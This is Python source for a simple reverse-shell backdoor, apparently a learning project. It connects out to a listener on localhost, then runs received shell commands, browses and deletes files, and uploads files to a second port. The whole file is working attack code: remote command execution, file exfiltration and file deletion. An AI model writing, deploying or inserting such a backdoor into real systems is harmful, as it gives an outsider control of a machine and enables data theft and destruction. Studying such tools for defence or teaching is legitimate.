import socket
import os
import subprocess
import urllib.request

#TODO

# get os type, get log of what's sent and executed (just unit test)

def pwd():
    """Return current working directory."""
    return os.getcwd()


def whoami():
    """Return user."""
    return os.getlogin()


def ls():
    """Return list of items in directory"""
    return os.listdir()


def cd(new_directory):
    """Change parent working directory."""
    os.chdir(new_directory)


def shred(item_path):
    """Remove folder or directory."""
    if os.path.isdir(item_path):
        os.rmdir(item_path)
    else:
        os.remove(item_path)


def send(connection_socket, target_file_path):
    """Open and send raw file data."""
    with open(target_file_path, 'rb') as file:
        while True:
            data = file.read(1024)
            if not data:
                break
            connection_socket.sendall(data)
    connection_socket.close()


def command(cmd):
    """Execute command and return process with its stdout and stderr."""
    proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return proc


def main():

    conn = socket.socket()
    conn.connect(('127.0.0.1', 9999))

    while True:
        cwd = os.getcwd()
        conn.sendall(f"\n{cwd}:~$$$ ".encode())
        cmd = conn.recv(4096).decode()

        split_command = cmd.rstrip().split(maxsplit=1)
        command_name = split_command[0].lower()
        arguments = split_command[1] if len(split_command) > 1 else ""


        if command_name == "pwd":
            conn.sendall(pwd().encode())
            continue

        elif command_name == "whoami":
            conn.sendall(whoami().encode())
            continue

        elif command_name == "ls":
            try:
                for item in ls():
                    conn.sendall(f"{item}\n".encode())
                continue
            except Exception as e:
                conn.sendall(f"Could not list directory: {e}\n".encode())
                continue

        elif command_name == "cd": 
            try:
                cd(arguments)
                continue
            except Exception as e:
                conn.sendall(f"Could not change directory: {e}\n".encode())
                continue

        elif command_name == 'shred':
            try:
                if os.path.isdir(arguments):
                    os.rmdir(arguments)
                else:
                    os.remove(arguments)
                continue
            except Exception as e:
                conn.sendall(f"Could not remove item: {e}".encode())
                continue

        elif command_name == "send":
            file_path = arguments
            try:
                send_socket = socket.socket()
                send_socket.connect(('127.0.0.1', 10000))
                send(send_socket, file_path)
                conn.sendall(f"Sent file: {split_command[1]}".encode())
                continue
            except Exception as e:
                conn.sendall(f"Could not send file: {e}".encode())
                continue

        elif command_name == "command":
            process = command(arguments)
            if process.stdout:
                conn.sendall(process.stdout)
                continue
            else:
                conn.sendall(process.stderr)
                continue

        elif command_name == "exitnow":
            conn.sendall(b">>>>> Closing connection.\n")
            conn.close()
            break

        else:
            conn.sendall(b"Invalid command.")
    
main()